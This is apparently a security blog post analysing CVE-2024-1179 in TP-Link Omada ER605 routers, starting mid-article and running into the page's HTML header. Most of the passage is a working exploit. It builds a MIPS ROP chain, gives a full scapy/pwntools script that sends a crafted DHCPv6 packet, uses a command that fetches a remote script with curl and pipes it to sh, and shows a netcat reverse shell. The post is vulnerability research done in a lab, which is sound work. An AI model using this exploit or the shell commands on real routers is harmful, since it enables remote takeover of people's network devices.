0x77f4a000 0x77f5a000 0x00010000 0x00000000 r-x /usr/lib/liblogger.so 0x77f5a000 0x77f5b000 0x00001000 0x00000000 rw- /usr/lib/liblogger.so 0x77f5b000 0x77fed000 0x00092000 0x00000000 r-x /lib/libc.so \u003c- $t9 0x77ffc000 0x77ffe000 0x00002000 0x00091000 rw- /lib/libc.so 0x77ffe000 0x78000000 0x00002000 0x00000000 rwx \u003c- $s6, $s7 0x7ffde000 0x7ffff000 0x00021000 0x00000000 rw- [stack] \u003c- $a1, $sp, $fp 0x7ffff000 0x80000000 0x00001000 0x00000000 r-x [vdso] But if we inspect the start of this region, it seems that it’s the GOT regions. We can see it in Ghidra and GDB shows us many libc addresses when we inspect these regions.\nWe also confirm this through dynamic analysis. We will not overwrite these addresses to avoid creating a mess. Starting from 0x42a600 we can see a lot of null bytes. So we can write there.\nNow we need to find a gadget that will allow us to write our command strings to an address. ROPgadget or ropper tools didn’t help us a lot.\nWe then came across a great idea. If we could find a gadget that uses strcpy with the destination address that we can control and with source address that is a stack address with a content we control, it would be great. To find this gadgets, we start by cross-referencig strcpy in the binary. This one looks promising:\ngef\u003e x/8i 0x40c4ac+1 0x40c4ad:\tli\tv0,0 0x40c4af:\tlw\ta0,132(sp) 0x40c4b1:\taddiu\ta1,sp,24 0x40c4b3:\tjal\t0x419131 0x40c4b7:\tsb\tv0,0(s1) 0x40c4b9:\trestore\t128,ra,s0-s1 0x40c4bb:\tjrc\tra 0x40c4bd:\tsltiu\ta2,112 Indeed, this gadget loads a0 (the destination) from stack offset, then loads the source a1(sb\tv0,0(s1) executed with the branch delay slots mechanism) using a stack pointer pointing to a value we control. The only downside of this is that at the end, the stack pointer will be increased by 128 (restore\t128,ra,s0-s1). As we want to chain gadgets, we hope that there will be other data that we controlled at this new stack pointer location. Let’s now modify our script accordingly by adding the following into the send_dhcp6_advertise function and adjusting our stack value and offset accordingly (We almost use the pwntools cyclic to find the offset).\nbinsh_addr = 0x0041317c w_region = 0x42a600 gadget1 = 0x0040c4ac+1 ## strcpy payload = b'a'*417 + p32(w_region+0x80) + p32(gadget1) # here s0 at offset 417 need to be valid address p1 = b'a'*21 p1+= b'command hop hop1 hip hop almpost secure ffffffffffffffffffffffff \\x00 fffffffffffffffffff' ## our command (source content) p1+= b'a'*17 p1+= b'cafe' # ## next pc/ra --\u003e next gadget p1+= b'a'*(132-len(p1)) p1+= p32(w_region) # destination pointer p1+= b'c' * (300-len(p1)) ## padding (not necessary ath this moment) payload = payload + p1 aftr_name_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload Let’s now execute this script and inspect what happens in GDB.\nWe can see in picture above that GDB stops at our next gadget cafe. We also see that this gadget effectively wrote our command at location 0x42a600.The command is truncated, but this is not a big problem at the moment, we will adjust it later. We also see that after the restore there is still enough data to handle the execve gadgets conditions.\nBut, let’s do a simple recap. For our execve we need argv to be ['/bin/sh', '-c', command, NULL]. With the strcpy gadget we have the command location and we already have /bin/sh location and we can easily write NULL into the stack. What remains is the -c strings location. First we can think that we can write it directly within the command strings by specifying something like -c\\x00\\x00my_super_command. But we can’t, simply because we are using strcpy and strcpy will stop at null bytes. So we have to use the strcpy gadgets a second time to write -c strings. After some trial and error, we notice that because of the restore 128 at the end using a second strcpy gadget increases too much the stack pointer so that we can no longer use our execve gadget to gain command execution. Because of that, we will find another gadget that not increase the stack pointer too much. We then came across this memcpy gadget.\n0x40c397:\tlw\ta0,92(sp) 0x40c399:\tli\ta2,16 0x40c39b:\tjal\t0x419261 0x40c39f:\taddiu\ta1,sp,24 0x40c3a1:\tli\tv0,1 0x40c3a3:\trestore\t88,ra,s0-s1 0x40c3a5:\tjrc\tra 0x40c3a7:\tnop Indeed, this gadget restore part is only increasing the stack pointer by 88 bytes. That is a good starting point. Furthermore, it loads a0 (the destination) from stack pointer and also loads into a1 a stack pointer which the content is under our control. This gadget will write only 0x10 bytes but we just need 0x4 bytes (-c\\x00\\x00). We can now modify our script to use this gadget:\ngadget2 = 0x40c396+1 # memcpy p1 = b'a'*21 p1+= b'command hop hop1 hip hop almpost secure ffffffffffffffffffffffff \\x00 fffffffffffffffffff' ## our command (source content) p1+= b'a'*17 p1+= p32(gadget2) # ## next pc/ra --\u003e next gadget p1+= b'a'*(132-len(p1)) p1+= p32(w_region) # destination pointer p2= b'b'*16 p2+= b'-c\\x00\\x00' ## -c strings p2+=b'z' * (84-len(p2)-0x4-0x4) p2+= b'cafe' ### 3 - next pc/ra --\u003e next gadget p2+= b'babe' p2+= p32(w_region+0x50) # destination pointer p2+= b'c' * (300-len(p1)-len(p2)) ## padding (not necessary ath this moment) payload = payload + p1 + p2 aftr_name_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload Inspecting GDB, we can see that we have effectively written -c strings and have more bytes padding left.\nNow we have everything we need to use the execve gadgets. But there is one more thing left. Let’s check the execve gadgets again:\ngef\u003e x/8i 0x40a8b6+1 0x40a8b7:\tlw\ta2,56(sp) 0x40a8b9:\tlw\ta0,136(sp) 0x40a8bb:\tjal\t0x419211 0x40a8bf:\taddiu\ta1,sp,44 0x40a8c1:\tjal\t0x4196e1 0x40a8c5:\tnop a0 will be populated from stack offset 136. With our current padding, this stack offset is out of control.\nWe need to increase the padding length. After some trial and error, we noticed that there is a maximum padding length that can still trigger the segfault at cafe address that is under our control as we saw earlier. This maximum length is 360. If we use a padding length greater than this value, the program still crash and trigger segfault, but at a location that is not under our control (probably into one of the library function). Let’s use this maximum padding length(360) and see if our execve gadget a0 argument can be a value that we control:\nThat is cool, we are so lucky.\nNow we can append our execve gadget to our ROP chain.\ngadget3 = 0x40a8b6+1 # execve p2= b'b'*16 p2+= b'-c\\x00\\x00' ## -c strings p2+=b'z' * (84-len(p2)-0x4-0x4) p2+= p32(gadget3) ### 3 - next pc/ra --\u003e next gadget p2+= b'babe' p2+= p32(w_region+0x50) # destination pointer p3= b'c'*36 p3+= p32(binsh_addr) + p32(w_region+0x50) + p32(w_region) # a1 = ['/bin/sh', '-c', command, a2=NULL] p3+= p32(0x0) # a2 = NULL = envp p3+= b'c'*(128-len(p3)) p3+= p32(binsh_addr) #a0 = '/bin/sh' p3+= b'c' * (358-len(p3)-len(p2) -len(p1)) payload = payload + p1 + p2 + p3 aftr_name_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload Inspecting in GDB before the execution, we have:\nSo everything is OK to execute our command. After the execution, we have the following on the qemu VM.\nGreat. This means we have our remote command execution. But if we try to change the command we trigger a Bus error issue in GDB. After digging into it, we found that this is caused by one of the branch delay slot that we are not handling very well.\n-\u003e 0x40c4bb e870 \u003cNO_SYMBOL\u003e jrc ra 0x40c4bd 5e41 \u003cNO_SYMBOL\u003e sltiu a2, 112 Maybe delay-slot This branch delay slot needed a2 to be a valid address. After the fix we have the following working script (see the comments for explanation):\nbinsh_addr = 0x0041317c w_region = 0x42a600 gadget1 = 0x0040c4ac+1 ## strcpy gadget2 = 0x40c396+1 # memcpy gadget3 = 0x40a8b6+1 # execve payload = b'a'*417 + p32(w_region+0x80) + p32(gadget1) # here s0 at offset 417 need to be valid address p1 = b'a'*24 p1+= b'commandhophop1hiphopalmpostsecurefffffffffffffffffffff ' ## our command (source content) p1+= b'a'*(120-len(p1)) ''' -\u003e 0x40c4bb e870 jrc ra 0x40c4bd 5e41 sltiu a2, 112 Maybe delay-slot ''' p1+= p32(w_region+0x70) ## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error) p1+= p32(gadget2) # ## next pc/ra --\u003e next gadget p1+= b'a'*(132-len(p1)) p1+= p32(w_region) # destination pointer p2= b'b'*16 ## If we choose b for exemple we will face the 0x2e (.) aftr_name, to avoid jsut extend the length p2+= b'-c\\x00\\x00' ## -c strings p2+=b'z' * (84-len(p2)-0x4-0x4) p2+= p32(gadget3) ### 3 - next pc/ra --\u003e next gadget p2+= b'babe' p2+= p32(w_region+0x50) # destination pointer p3= b'c'*36 p3+= p32(binsh_addr) + p32(w_region+0x50) + p32(w_region) # a1 = ['/bin/sh', '-c', command, a2=NULL] p3+= p32(0x0) # a2 = NULL = envp p3+= b'c'*(128-len(p3)) p3+= p32(binsh_addr) #a0 = '/bin/sh' p3+= b'c' * (358-len(p3)-len(p2) -len(p1)) payload = payload + p1 + p2 + p3 aftr_name_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload And in the VM after the execution, we have:\nPerfect ! the . is there because the binary wrote it there to conform with the AFTR_NAME. This will not cause any damage to our exploitation , we can handle it easily. Now the question is what command we will run. As we want a reverse shell and that we have a tiny space before the . we will just execute a command to download a bash file that will contain the final payload and execute it. We can do it simply with curl: curl http://addresse:port/x|sh;# The # is there to filter the rest of command so that it will be considered as comment and will not be executed. On the sub-net we created our host address is 10.212.81.52 and we choose to serve the bash file on port 8888. So our command is: curl http://10.212.81.52:8888/x|sh;#\nbr0: flags=4419 mtu 1500 inet 10.212.81.52 netmask 255.255.0.0 broadcast 10.212.255.255 inet6 fe80::542b:76ce:631b:36ce prefixlen 64 scopeid 0x20 ether da:30:2c:48:59:a8 txqueuelen 1000 (Ethernet) RX packets 2477143 bytes 1947827351 (1.9 GB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1312938 bytes 229493321 (229.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 The python script is now:\n. . . p1 = b'a'*24 p1+= b'curl http://10.212.81.52:8888/x|sh;#' ## our command (source content) p1+= b'a'*(120-len(p1)) ''' -\u003e 0x40c4bb e870 jrc ra 0x40c4bd 5e41 sltiu a2, 112 Maybe delay-slot ''' p1+= p32(w_region+0x70) ## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error) p1+= p32(gadget2) # ## next pc/ra --\u003e next gadget p1+= b'a'*(132-len(p1)) p1+= p32(w_region) # destination pointer . . . And after execution:\nThe file that will be downloaded can be something like this:\nBut as netcat is installed, we opt for a reverse shell based on mkfifo which we get from here. We replace the redirection of stderr to stdout (2\u003e\u00261) with a redirection from socket file descriptor number 3 to stdout (3\u003e\u00261).\n#!/bin/bash mkfifo /tmp/f;nc 10.212.81.52 4444 0\u00261|tee /tmp/f The bash file will be hosted in our host machine. So we use python HTTP server to host this file, named x.\npython3 -m http.server 8888 and then is another terminal we start a netcat listener:\nnc -lnvp 4444 And boom !! We have a reverse shell !!!!\nOn Qemu WM side we have this.\nAnd on our host machine listener terminal:\nGreat. The complete exploitation script is as follows:\nfrom scapy.all import * from scapy.layers.inet6 import IPv6, UDP from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6OptServerId, DHCP6OptClientId from pwn import * import time ''' br0: flags=4419 mtu 1500 inet 10.212.81.52 netmask 255.255.0.0 broadcast 10.212.255.255 inet6 fe80::542b:76ce:631b:36ce prefixlen 64 scopeid 0x20 ether da:30:2c:48:59:a8 txqueuelen 1000 (Ethernet) RX packets 652899 bytes 434959083 (434.9 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 284487 bytes 81342637 (81.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ''' target_mac = \"00:11:22:33:44:55\" # qemu br0_mac = \"da:30:2c:48:59:a8\" br0_link_local_inet6 = \"fe80::542b:76ce:631b:36ce\" def filter_solicit_msg(pkt): return pkt.haslayer(DHCP6_Solicit) and pkt[Ether].src == target_mac def send_dhcp6_advertise(p): # Set up Ethernet layer with source and destination MAC addresses src_mac = br0_mac # Bridge interface MAC address dst_mac = p[Ether].src # Client's MAC address from original packet ethernet_layer = Ether(src=src_mac, dst=dst_mac) # Set up IPv6 layer with source and destination addresses ipv6_dst = p[IPv6].src # Client's IPv6 address from original packet ipv6_src = br0_link_local_inet6 # Bridge interface link-local address ipv6_layer = IPv6(src=ipv6_src, dst=ipv6_dst) # Set up UDP layer with DHCPv6 ports # Port 547: Server port, Port 546: Client port udp_layer = UDP(sport=547, dport=546) # Extract client DUID and transaction ID from original Solicit message client_duid = p[DHCP6OptClientId].duid trid = p[DHCP6_Solicit].trid dhcp6_advertise = DHCP6_Advertise(trid=trid) # Create DHCPv6 options client_id = DHCP6OptClientId(duid=client_duid) # Client Identifier option server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=1, lladdr=src_mac)) # Server Identifier option # AFTR_NAME option # \u003e\u003e\u003e hex(63) == '0x3f' code = b'\\x00\\x40' # aftr_name: size + string + size + string + ... + #payload = (b'\\x30' + b'a' * 0x30) * 10 binsh_addr = 0x0041317c w_region = 0x42a600 gadget1 = 0x0040c4ac+1 ## strcpy gadget2 = 0x40c396+1 # memcpy gadget3 = 0x40a8b6+1 # execve payload = b'a'*417 + p32(w_region+0x80) + p32(gadget1) # here s0 at offset 417 need to be valid address p1 = b'a'*24 p1+= b'curl http://10.212.81.52:8888/x|sh;#' ## our command (source content) p1+= b'a'*(120-len(p1)) ''' -\u003e 0x40c4bb e870 jrc ra 0x40c4bd 5e41 sltiu a2, 112 Maybe delay-slot ''' p1+= p32(w_region+0x70) ## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error) p1+= p32(gadget2) # ## next pc/ra --\u003e next gadget p1+= b'a'*(132-len(p1)) p1+= p32(w_region) # destination pointer p2= b'b'*16 ## If we choose b for exemple we will face the 0x2e (.) aftr_name, to avoid jsut extend the length p2+= b'-c\\x00\\x00' ## -c strings p2+=b'z' * (84-len(p2)-0x4-0x4) p2+= p32(gadget3) ### 3 - next pc/ra --\u003e next gadget p2+= b'babe' p2+= p32(w_region+0x50) # destination pointer p3= b'c'*36 p3+= p32(binsh_addr) + p32(w_region+0x50) + p32(w_region) # a1 = ['/bin/sh', '-c', command, a2=NULL] p3+= p32(0x0) # a2 = NULL = envp p3+= b'c'*(128-len(p3)) p3+= p32(binsh_addr) #a0 = '/bin/sh' p3+= b'c' * (358-len(p3)-len(p2) -len(p1)) payload = payload + p1 + p2 + p3 aftr_name_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload #af = code + b'\\x30'*1000 # 14=0xe = RAPID_COMMIT, normally len should be 0, but we want to trigger an error so voila code = b'\\x00\\x0e' payload = (b'\\x01') rapid_commit_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload # Combine all layers and send packet pck = ethernet_layer / ipv6_layer / udp_layer / dhcp6_advertise / server_id / client_id / aftr_name_option / rapid_commit_option print(pck) sendp(pck, iface=\"br0\", verbose=False) interface = 'br0' response = sniff(iface=interface, filter=\"udp and port 546\", prn=send_dhcp6_advertise, lfilter=filter_solicit_msg) The x file contents:\n#!/bin/bash mkfifo /tmp/f;nc 10.212.81.52 4444 0\u00261|tee /tmp/f Conclusion This analysis demonstrates a reliable exploitation path for CVE-2024-1179. While the attack requires some knowledge of MIPS architecture and bypass of standard OS protections, this vulnerability is fairly easy to weaponize. We successfully achieve a remote code execution from the WAN side of the router. This vulnerability highlights the importance of rigorous bounds checking on all user-controlled input, enabling compiler security features , following secure coding guidelines for buffer management etc. It also emphasizes how critical proper security practices are, especially in network infrastructure devices where vulnerabilities can have significant consequences.\nReferences https://nvd.nist.gov/vuln/detail/CVE-2024-1179\nhttps://www.z1r0.top/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/\nhttps://blog.compass-security.com/2024/08/a-patchdiffing-journey-tp-link-omada/\nhttps://diffing.quarkslab.com/tutorials/04c_firmware_diffing.html\nhttps://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/\nhttps://cve-north-stars.github.io/docs/Root-Cause-Analysis\nhttps://github.com/clearbluejar/ghidriff\nhttps://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d\nhttps://forum.turris.cz/t/etc-init-d-rcs-is-missing-what-gives/4745\nhttps://blahcat.github.io/2017-07-14-building-a-debian-stretch-qemu-image-for-mipsel/\nhttp://archive.debian.org/debian/dists/jessie/main/installer-mipsel/current/images/malta/netboot/ http://archive.debian.org/debian\n","wordCount":"11986","inLanguage":"en","datePublished":"2025-04-04T20:32:54+02:00","dateModified":"2025-04-04T20:32:54+02:00","author":{"@type":"Person","name":"dilag","url":"https://dilagluc.github.io/en/about-dilag/"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://dilagluc.github.io/en/posts/2025/cve_analysis/tplink_cve_2024_1179/"},"publisher":{"@type":"Organization","name":"Blog","description":"Continuing Hermit\u0026#39;s legacy to be minimal and fast theme","logo":{"@type":"ImageObject","url":"https://dilagluc.github.io/favicon.ico"}}}</script><title>TP Link CVE-2024-1179 analysis</title><link rel="stylesheet dns-prefetch preconnect preload prefetch" as=style media=screen href=https://dilagluc.github.io/css/style.min.cbb61c13ffe36e23de11896ce5cb9f37cf539353029dd4d553dddd3403b2d24e.css integrity="sha256-y7YcE//jbiPeEYls5cufN89Tk1MCndTVU93dNAOy0k4=" crossorigin=anonymous></head><body id=page><header id=site-header><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://dilagluc.github.io/>Blog</a></div><nav class="site-nav hide-in-mobile"><a href=https://dilagluc.github.io/en/posts/>Posts</a><a href=https://dilagluc.github.io/en/about-dilag/>About Me</a></nav></div><div class="hdr-right hdr-icons"><span class="hdr-links hide-in-mobile"><a href=https://github.com/dilagluc/ target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://github.com/1bl4z3r/hermit-V2/tree/staging target=_blank rel="noopener me" title=Discord><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M8.82889 11.203C7.86239 11.203 7.09937 12.0508 7.09937 13.0852c0 1.0343.779979999999999 1.8821 1.72952 1.8821C9.79538 14.9673 10.5584 14.1195 10.5584 13.0852 10.5754 12.0508 9.79538 11.203 8.82889 11.203zm6.18891.0c-.9664.0-1.7295.847800000000001-1.7295 1.8822.0 1.0343.780000000000001 1.8821 1.7295 1.8821.9665.0 1.7296-.847799999999999 1.7296-1.8821.0-1.0344-.7631-1.8822-1.7296-1.8822z" fill="currentcolor"/><path d="M14.8477 18.3649C14.8874 18.4483 14.9381 18.5296 15.0005 18.6075 15.3663 19.0644 15.7387 19.5135 15.8832 19.687 16.1242 19.9764 16.4855 20.1329 16.8553 20.117c3.8286-.1648 5.55-2.5107 5.8573-2.9828C22.8526 16.919 22.9029 16.6887 22.9023 16.4867 22.8862 11.0873 20.6126 6.69288 20.3618 6.22299 20.2686 6.04849 20.1448 5.9213 20.0223 5.83024c-2.3899-1.77582-4.6825-1.93766-5.2236-1.95079C14.4248 3.87037 14.1018 4.039 13.8908 4.28019 13.7833 4.40298 13.7069 4.53817 13.659 4.67843 12.4808 4.5498 11.3488 4.5684 10.3271 4.681 10.2848 4.54257 10.2137 4.40813 10.1111 4.28494 9.90289 4.03513 9.58304 3.87239 9.22517 3.87894 8.72884 3.88801 6.40341 4.02781 3.9777 5.83024 3.85516 5.9213 3.73139 6.04849 3.63825 6.22299c-.25083.4699-2.5246 4.86461-2.54051 10.26431C1.09715 16.6871 1.14634 16.9155 1.28416 17.1296 1.58866 17.6027 3.29601 19.9515 7.12649 20.1169 7.50079 20.1331 7.86486 19.9726 8.10512 19.6794 8.2521 19.5 8.63516 19.0311 9.00416 18.5683 9.06865 18.4874 9.12057 18.4028 9.16075 18.316 9.32759 18.3546 9.49869 18.391 9.67405 18.4248L9.68004 18.426C11.0465 18.681 12.6626 18.7747 14.4312 18.4443 14.5698 18.4206 14.7086 18.3942 14.8477 18.3649z" stroke="currentcolor" stroke-width="2"/></svg></a><a href=https://x.com/dilag_luc target=_blank rel="noopener me" title=X><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path class="st0" d="m21.3 21.1L9.9 2.9H2.7l11.4 18.2zm-18.6.0 7.2-6.6m4.2-5 7.2-6.6"/></svg></a></span><button id=share-btn class=hdr-btn title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-share-2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></button><div id=share-links class="animated fast"><ul><li><a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2025%2fcve_analysis%2ftplink_cve_2024_1179%2f&amp;text=TP%20Link%20CVE-2024-1179%20analysis" target=_blank rel=noopener aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path class="st0" d="m21.3 21.1L9.9 2.9H2.7l11.4 18.2zm-18.6.0 7.2-6.6m4.2-5 7.2-6.6"/></svg></a></li><li><a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2025%2fcve_analysis%2ftplink_cve_2024_1179%2f" target=_blank rel=noopener aria-label="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a></li><li><a href="mailto:?subject=TP%20Link%20CVE-2024-1179%20analysis&amp;body=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2025%2fcve_analysis%2ftplink_cve_2024_1179%2f" target=_self rel=noopener aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></a></li><li><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fdilagluc.github.io%2fen%2fposts%2f2025%2fcve_analysis%2ftplink_cve_2024_1179%2f&amp;source=https%3a%2f%2fdilagluc.github.io%2f&amp;title=TP%20Link%20CVE-2024-1179%20analysis&amp;summary=TP%20Link%20CVE-2024-1179%20analysis%2c%20by%20dilag%0a%0aAnalyse%20CVE-2024-1179%2c%20a%20vulnerability%20used%20to%20get%20RCE%20in%20TP%20Link%20router%20during%20Pwn2Own%20TORONTO%202023%20contest%0a" target=_blank rel=noopener aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a></li><li><a href=# onclick='return linkShare("TP Link CVE-2024-1179 analysis","https://dilagluc.github.io/en/posts/2025/cve_analysis/tplink_cve_2024_1179/",`TP Link CVE-2024-1179 analysis, by dilag

Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest
`),!1' target=_self rel=noopener aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></a></li></ul></div><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://dilagluc.github.io/en/posts/>Posts</a></li><li><a href=https://dilagluc.github.io/en/about-dilag/>About Me</a></li></ul></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-date><span>Apr 4, 2025</span></div><h1>TP Link CVE-2024-1179 analysis</h1></header><div class=post-description><p>Analyse CVE-2024-1179, a vulnerability used to get RCE in TP Link router during Pwn2Own TORONTO 2023 contest</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 00-8.49-8.49L5 10.5V19h8.5z"/><line x1="16" y1="8" x2="2" y2="22"/><line x1="17.5" y1="15" x2="9" y2="15"/></svg><a href=https://dilagluc.github.io/en/about-dilag/ target=_blank>dilag</a></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://dilagluc.github.io/en/tags/exploit-development>exploit development</a></span><span class=tag><a href=https://dilagluc.github.io/en/tags/reverse>reverse</a></span><span class=tag><a href=https://dilagluc.github.io/en/tags/cve>cve</a></span><span class=tag><a href=https://dilagluc.github.io/en/tags/hardware>Hardware</a></span><span class=tag><a href=https://dilagluc.github.io/en/tags/firmware-analysis>Firmware Analysis</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>11986&nbspWords … ⏲ Reading Time:54 Minutes, 28 Seconds</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2025-04-04 18:32 +0000</p></div><hr class=post-end><div class=content><h2 id=introduction>Introduction<a href=#introduction class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>The shift to remote work has dramatically increased the importance of securing Small Office/Home Office (SOHO) network devices. These consumer devices often present security challenges due to their limited security capabilities and inconsistent update practices. This has created an urgent need to better understand and address vulnerabilities in the SOHO ecosystem.</p><p>This blogpost presents an in-depth technical analysis of <strong><a href=https://nvd.nist.gov/vuln/detail/CVE-2024-1179>CVE-2024-1179</a></strong>, a vulnerability affecting TP-Link Omada ER605 routers. We&rsquo;ll describe the root cause of this vulnerability and provide an exploitation path.</p><h2 id=detailed-analysis>Detailed analysis<a href=#detailed-analysis class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>This vulnerability seems first to be exploited at <strong>Pwn2Own TORONTO 2023</strong> contest. The advisory from <a href=https://www.zerodayinitiative.com/advisories/ZDI-24-085/>ZDI website</a> is as follow:</p><blockquote><p>[!note]- ZDI advisory
